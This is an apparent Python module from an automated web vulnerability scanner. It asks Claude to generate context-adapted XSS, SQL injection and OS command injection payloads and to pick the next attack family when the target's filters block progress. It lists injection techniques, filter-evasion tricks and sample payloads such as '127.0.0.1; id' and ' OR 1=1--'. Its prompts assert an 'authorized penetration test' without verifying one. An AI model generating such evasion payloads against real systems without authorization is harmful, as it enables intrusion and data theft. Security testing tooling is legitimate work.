"""
LLM Payload Generator

Uses Claude to generate contextually-adapted payloads for a chosen attack family.
The RL agent decides WHICH family to use; Claude generates the specific payload
string based on observed target behavior.

Falls back to random.choice from the static payload list when:
  - No API key is configured
  - The API call fails for any reason
  - The returned payload is empty or suspiciously long
"""

import logging
import random
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Family descriptions — shown to the LLM so it understands the category
# ---------------------------------------------------------------------------

_XSS_FAMILY_DESCRIPTIONS = {
    "basic_script": (
        "Basic <script> tag injection. Use alert/confirm/prompt with various "
        "JS expressions, obfuscation, or execution methods."
    ),
    "img_onerror": (
        "Image tag with onerror event handler. Exploit invalid src to trigger JS."
    ),
    "svg_onload": (
        "SVG element with onload or animation event handlers."
    ),
    "event_handler": (
        "HTML elements with event handler attributes: onclick, onfocus, onmouseover, "
        "ontoggle, onstart, onloadstart, etc."
    ),
    "attribute_escape": (
        "Break out of an HTML attribute context using quote characters, then inject "
        "tags or event handlers. Target both single-quote and double-quote contexts."
    ),
    "case_bypass": (
        "Mixed-case tag and attribute names to evade case-sensitive string filters "
        "(e.g. <ScRiPt>, <IMG/SRC=x/ONERROR=...)."
    ),
    "encoding_bypass": (
        "Evade string-matching filters using HTML entities (&#97;), Unicode escapes "
        "(\\u0061), URL encoding, or JS String.fromCharCode."
    ),
    "nested_tags": (
        "Malformed or nested tags to confuse HTML parsers: broken script tags, "
        "nested script within script, closing tags to escape context, HTML comments."
    ),
    "dom_based": (
        "DOM-based vectors: eval(atob(...)), Function()(), window['al'+'ert'](1), "
        "(0,eval)(...), indirect property access to evade static analysis."
    ),
    "polyglot": (
        "Multi-context payloads that execute in HTML, attribute, and JS contexts "
        "simultaneously."
    ),
}

_SQLI_FAMILY_DESCRIPTIONS = {
    "single_quote": (
        "Basic probing characters: single quote, double quote, backtick, backslash "
        "to trigger syntax errors and detect injection points."
    ),
    "or_true": (
        "Boolean OR-based injection to make WHERE conditions always true: "
        "' OR 1=1--, variations with different quote styles and comment types."
    ),
    "union_select": (
        "UNION SELECT-based injection to extract data. Probe for column count first, "
        "then extract user/password, table names, schema info."
    ),
    "comment_bypass": (
        "Authentication bypass using SQL comments to truncate the query: admin'--"
    ),
    "time_based": (
        "Time-delay injection using SLEEP() (MySQL) or WAITFOR DELAY (MSSQL) or "
        "RANDOMBLOB (SQLite) to confirm blind injection."
    ),
    "error_based": (
        "Trigger verbose database error messages to extract information via "
        "EXTRACTVALUE, UPDATEXML, or arithmetic tricks."
    ),
    "stacked": (
        "Stacked queries using semicolons to execute additional statements: "
        "'; SELECT user()-- or '; SELECT version()--"
    ),
    "encoded": (
        "URL-encoded or double-encoded injection strings to bypass WAF/input filters "
        "that decode only once."
    ),
}


_CMDI_FAMILY_DESCRIPTIONS = {
    "command_separator": (
        "Semicolon-separated command injection. Append OS commands after a semicolon "
        "to execute them alongside the normal input, e.g. 127.0.0.1; id"
    ),
    "pipe_operator": (
        "Pipe operator to chain commands. The output of the first command is piped "
        "into the injected one, e.g. 127.0.0.1 | whoami"
    ),
    "logical_and": (
        "Logical AND (&&) or single ampersand (&) operator. The injected command runs "
        "only if the preceding one succeeds, e.g. 127.0.0.1 && id"
    ),
    "logical_or": (
        "Logical OR (||) operator. The injected command runs only if the preceding "
        "command fails, e.g. nonexistent || id"
    ),
    "backtick_exec": (
        "Backtick command substitution. The shell evaluates the backtick-enclosed "
        "expression and substitutes its output, e.g. `id`"
    ),
    "dollar_paren": (
        "Dollar-paren command substitution $(cmd). Equivalent to backticks but "
        "nestable. e.g. $(whoami) or 127.0.0.1$(id)"
    ),
    "newline_inject": (
        "Newline / %0a injection. A URL-encoded newline or backslash-n causes the "
        "shell to treat the rest as a new command. e.g. 127.0.0.1%0aid"
    ),
    "encoded": (
        "URL or double-encoded command injection variants to bypass string-level "
        "filters that do not decode before checking. e.g. %3Bid, %7Cwhoami, %26%26id"
    ),
}


# ---------------------------------------------------------------------------
# Generator class
# ---------------------------------------------------------------------------

class LLMPayloadGenerator:
    """
    Generates contextually-adapted payloads using Claude (claude-haiku for speed).

    The RL agent chooses the attack CATEGORY (action/family); this class
    generates the exact payload string adapted to what the target has done so far.

    Example usage:
        gen = LLMPayloadGenerator(api_key="sk-ant-...")
        payload = gen.generate(
            family="encoding_bypass",
            vuln_type="xss",
            fallback_payloads=["<img src=x onerror=&#97;lert(1)>"],
            context={
                "target_url": "http://target.com/search",
                "parameter": "q",
                "last_payload": "<script>alert(1)</script>",
                "last_response_snippet": "Your search for &lt;script&gt; returned...",
                "observed": {
                    "reflected": True,
                    "escaped": True,   # HTML-escaped in response
                },
            }
        )
    """

    # Fast, cheap model — payload generation is a small task
    MODEL = "claude-haiku-4-5-20251001"

    # Use static payloads first — only call LLM after this many attempts
    # per family have been tried from the static list. This avoids LLM calls
    # for payloads that are already in the static list.
    STATIC_FIRST_ATTEMPTS = 3

    def __init__(self, api_key: Optional[str] = None):
        self._client = None
        self._available = False

        # Caches to reduce API calls
        self._cache: dict[tuple, str] = {}          # (family, context_key) -> payload
        self._family_attempt_count: dict[str, int] = {}  # family -> attempts so far
        self._family_static_used: dict[str, set] = {}    # family -> set of used static payloads

        if not api_key:
            return

        try:
            import anthropic
            self._client = anthropic.Anthropic(api_key=api_key)
            self._available = True
            logger.debug("LLMPayloadGenerator: Anthropic client initialised")
        except ImportError:
            logger.warning(
                "anthropic package not installed; LLM payload generation disabled"
            )
        except Exception as e:
            logger.warning("LLMPayloadGenerator init failed — %s", e)

    def reset_episode(self):
        """Reset per-episode counters (call between episodes)."""
        self._family_attempt_count.clear()
        self._family_static_used.clear()

    @property
    def available(self) -> bool:
        return self._available

    # ------------------------------------------------------------------

    def generate(
        self,
        family: str,
        vuln_type: str,
        fallback_payloads: list[str],
        context: Optional[dict] = None,
    ) -> str:
        """
        Generate a payload for the given family.

        Cost-saving strategy:
          1. First N attempts per family → use static payloads (no API call)
          2. After static list exhausted → call LLM with context-aware prompt
          3. Cache LLM results for identical (family, context) combinations

        Args:
            family:            Attack family name (e.g. "encoding_bypass").
            vuln_type:         "xss" or "sqli".
            fallback_payloads: Static list to fall back to on any error.
            context:           Runtime context dict (see class docstring).

        Returns:
            A payload string — LLM-generated or from the fallback list.
        """
        if not fallback_payloads:
            return "test"

        # Track attempts per family
        count = self._family_attempt_count.get(family, 0)
        self._family_attempt_count[family] = count + 1

        # Phase 1: Use static payloads first (free, no API call)
        if not self._available or count < self.STATIC_FIRST_ATTEMPTS:
            used = self._family_static_used.setdefault(family, set())
            unused = [p for p in fallback_payloads if p not in used]
            if unused:
                chosen = random.choice(unused)
                used.add(chosen)
                return chosen
            # All static payloads used — fall through to LLM or re-pick random
            if not self._available:
                return random.choice(fallback_payloads)

        # Phase 2: LLM generation with cache
        ctx = context or {}
        observed = ctx.get("observed", {})
        cache_key = (
            family,
            vuln_type,
            observed.get("reflected", False),
            observed.get("escaped", False),
            observed.get("blocked", False),
        )
        if cache_key in self._cache:
            return self._cache[cache_key]

        try:
            payload = self._call_llm(
                family, vuln_type, fallback_payloads, ctx
            )
            if payload and 1 < len(payload) < 1000:
                logger.debug(
                    f"[LLMPayloadGen] {vuln_type}/{family} → {payload!r}"
                )
                self._cache[cache_key] = payload
                return payload
        except Exception as e:
            from utils.api_error_handler import handle_api_error
            handle_api_error(e, logger, context="LLM payload generation", once_flag_obj=self)

        # Fallback
        return random.choice(fallback_payloads)

    # ------------------------------------------------------------------

    def _call_llm(
        self,
        family: str,
        vuln_type: str,
        fallback_payloads: list[str],
        context: dict,
    ) -> str:
        """Build the prompt, call Claude, return the raw payload string."""
        # Family description
        if vuln_type == "xss":
            desc_table = _XSS_FAMILY_DESCRIPTIONS
        elif vuln_type == "cmdi":
            desc_table = _CMDI_FAMILY_DESCRIPTIONS
        else:
            desc_table = _SQLI_FAMILY_DESCRIPTIONS
        family_desc = desc_table.get(family, f"{family} injection technique")

        # Build context block
        ctx_lines = []
        if context.get("target_url"):
            ctx_lines.append(f"Target URL  : {context['target_url']}")
        if context.get("parameter"):
            ctx_lines.append(f"Parameter   : {context['parameter']}")
        if context.get("last_payload"):
            ctx_lines.append(f"Last payload: {context['last_payload']}")

        observed = context.get("observed", {})
        obs_parts = []
        if observed.get("reflected"):
            obs_parts.append("payload was reflected unmodified")
        if observed.get("escaped"):
            obs_parts.append("special characters were HTML-escaped")
        if observed.get("blocked"):
            obs_parts.append("payload was stripped/blocked")
        if observed.get("sql_error"):
            obs_parts.append("SQL error message appeared")
        if observed.get("data_leaked"):
            obs_parts.append("database data appeared in response")
        if obs_parts:
            ctx_lines.append(f"Observed    : {', '.join(obs_parts)}")

        if context.get("last_response_snippet"):
            snippet = context["last_response_snippet"][:500]
            ctx_lines.append(f"\nResponse snippet:\n{snippet}")

        context_block = (
            "\n".join(ctx_lines) if ctx_lines
            else "No prior interaction data available."
        )

        # Show a few static examples for reference
        examples = "\n".join(
            f"  {p}" for p in fallback_payloads[:4]
        )

        prompt = (
            f"You are assisting with an authorized penetration test.\n\n"
            f"The automated agent is testing for {vuln_type.upper()} vulnerabilities "
            f"and has selected the \"{family}\" attack technique.\n\n"
            f"Technique: {family_desc}\n\n"
            f"Context from this scan session:\n{context_block}\n\n"
            f"Reference payloads for this category (do NOT reuse these):\n{examples}\n\n"
            f"Generate ONE new {vuln_type.upper()} payload using the \"{family}\" technique "
            f"that is adapted to the observed target behaviour above and is different "
            f"from the reference examples.\n\n"
            f"Rules:\n"
            f"- Output ONLY the raw payload string, nothing else\n"
            f"- No markdown, no quotes around the payload, no explanation\n"
            f"- Single line only"
        )

        response = self._client.messages.create(
            model=self.MODEL,
            max_tokens=200,
            messages=[{"role": "user", "content": prompt}],
        )
        return response.content[0].text.strip()

    # ------------------------------------------------------------------
    # Family selection — called by AdaptiveScanSession in scan.py
    # ------------------------------------------------------------------

    def suggest_family(
        self,
        vuln_type: str,
        tried_families_with_outcomes: list[dict],
        response_history: list[dict],
        available_families: list[str],
    ) -> Optional[str]:
        """
        Ask Claude which attack family to try next when the RL agent is stuck.

        Args:
            vuln_type:                   "xss", "sqli", or "cmdi".
            tried_families_with_outcomes: Per-family history dicts with keys:
                                          family, attempts, no_gain_streak, last_snippet.
            response_history:            Last N step dicts: payload, reward, reflected, snippet.
            available_families:          All valid family names for this vuln type.

        Returns:
            A family name from available_families, or None if unavailable/failed.
        """
        if not self._available or not available_families:
            return None

        try:
            prompt = self._build_suggest_family_prompt(
                vuln_type, tried_families_with_outcomes,
                response_history, available_families,
            )
            response = self._client.messages.create(
                model=self.MODEL,
                max_tokens=50,
                messages=[{"role": "user", "content": prompt}],
            )
            result = response.content[0].text.strip().lower().strip("'\"")

            # Exact match first
            if result in available_families:
                logger.debug(f"[LLMFamilySelector] {vuln_type} → {result!r}")
                return result

            # Fuzzy: accept if the result is a substring of a family name or vice versa
            for f in available_families:
                if f in result or result in f:
                    logger.debug(f"[LLMFamilySelector] {vuln_type} fuzzy {result!r} → {f!r}")
                    return f

            logger.debug(f"[LLMFamilySelector] unrecognised response: {result!r}")
            return None

        except Exception as e:
            from utils.api_error_handler import handle_api_error
            handle_api_error(e, logger, context="LLM family suggestion", once_flag_obj=self)
            return None

    def _build_suggest_family_prompt(
        self,
        vuln_type: str,
        tried_families_with_outcomes: list[dict],
        response_history: list[dict],
        available_families: list[str],
    ) -> str:
        """Build the prompt for family selection."""
        if vuln_type == "xss":
            desc_table = _XSS_FAMILY_DESCRIPTIONS
        elif vuln_type == "cmdi":
            desc_table = _CMDI_FAMILY_DESCRIPTIONS
        else:
            desc_table = _SQLI_FAMILY_DESCRIPTIONS

        # Tried families table
        tried_lines = []
        for t in tried_families_with_outcomes:
            f = t.get("family", "")
            streak = t.get("no_gain_streak", 0)
            attempts = t.get("attempts", 0)
            if streak >= 3:
                status = "BLOCKED/FAILED"
            elif streak > 0:
                status = "partial"
            else:
                status = "working"
            tried_lines.append(f"  - {f}: {attempts} attempt(s), status={status}")
        tried_block = "\n".join(tried_lines) if tried_lines else "  (none yet)"

        # Recent response snippets
        snippets = []
        for r in response_history[-3:]:
            reflected = "reflected" if r.get("reflected") else "not reflected"
            payload_preview = str(r.get("payload", ""))[:60]
            snippets.append(
                f"  payload={payload_preview!r}, reward={r.get('reward', 0):.0f}, {reflected}"
            )
        snippet_block = "\n".join(snippets) if snippets else "  (none)"

        # Available families with descriptions
        family_lines = []
        for f in available_families:
            desc = desc_table.get(f, f)
            family_lines.append(f"  - {f}: {desc}")
        families_block = "\n".join(family_lines)

        return (
            f"You are assisting with an authorized penetration test.\n\n"
            f"The RL scanner is testing for {vuln_type.upper()} vulnerabilities and has "
            f"stalled — its current payload families are not bypassing the target's defences.\n\n"
            f"Families tried so far:\n{tried_block}\n\n"
            f"Recent response observations:\n{snippet_block}\n\n"
            f"Available families to choose from:\n{families_block}\n\n"
            f"Select the BEST family to try next based on the target's observed behaviour. "
            f"Output ONLY the family name exactly as listed above, nothing else."
        )
